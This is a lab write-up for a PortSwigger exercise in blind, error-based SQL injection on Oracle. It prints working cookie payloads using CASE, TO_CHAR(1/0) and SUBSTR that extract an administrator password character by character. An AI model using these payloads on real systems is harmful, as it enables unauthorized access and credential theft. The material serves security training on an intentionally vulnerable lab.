# Blind SQL injection with conditional errors

This lab uses a blind SQL injection point in the tracking cookie. The
normal query result is not reflected in the response, and the page does
not distinguish between a query that returns rows and one that does not.

The useful signal is instead a custom error response. By deliberately
causing a database error only when a condition is true, the response
status can reveal information one character at a time.

The database is Oracle, and the goal is to recover the administrator
password and log in.

------------------------------------------------------------------------

References:

-   https://portswigger.net/web-security/sql-injection/blind
-   https://portswigger.net/web-security/sql-injection/cheat-sheet

------------------------------------------------------------------------

The injection is located in the tracking cookie. A basic condition can
first be tested without producing an error:

``` text
COOKIE'+and'1'='1
```

``` text
Cookie: TrackingId=9HCLCYU9VeK78knn'+and'1'='1
```

<img width="803" height="401" alt="1" src="https://github.com/user-attachments/assets/3ab9817a-ef80-423f-91d8-15f44e8d5708" />


For MySQL, a conditional division-by-zero approach could be written as:

``` text
COOKIE' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
COOKIE' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

Because this lab uses Oracle, the equivalent expression uses `TO_CHAR`
and `FROM dual`:

``` text
COOKIE' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
COOKIE' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
```

The URL-encoded cookie versions are:

``` text
9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
```

When the condition is true (`1=1`), the application responds with HTTP
500.

<img width="803" height="431" alt="2" src="https://github.com/user-attachments/assets/91150a26-53f0-4409-bae8-b9bc10563456" />


When the condition is false (`1=2`), the response is HTTP 200.

<img width="798" height="430" alt="3" src="https://github.com/user-attachments/assets/3f64336c-81e1-46db-bf33-bda23ed366fd" />


This behavior can be used to test password characters. For the first
character, the Oracle `SUBSTR` function is used:

``` text
COOKIE' AND (SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1))='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
```

``` text
9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1))='a')+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
```

<img width="802" height="461" alt="4" src="https://github.com/user-attachments/assets/4bf4119f-cd32-428a-855b-4bc392532d29" />


The request can be sent to Intruder and different letters and numbers
can be tested. The character that produces a 500 response is the correct
character.

<img width="656" height="367" alt="5" src="https://github.com/user-attachments/assets/a6b7c7f5-0bd1-4856-b793-6593ee95d2ce" />


The first character is `0`.

<img width="510" height="151" alt="6" src="https://github.com/user-attachments/assets/a78aca21-2069-4433-ae2a-0841ba62c185" />


Continuing the same process reveals the complete password:
`01k6j5tbrjpd9lpdk4zs`.
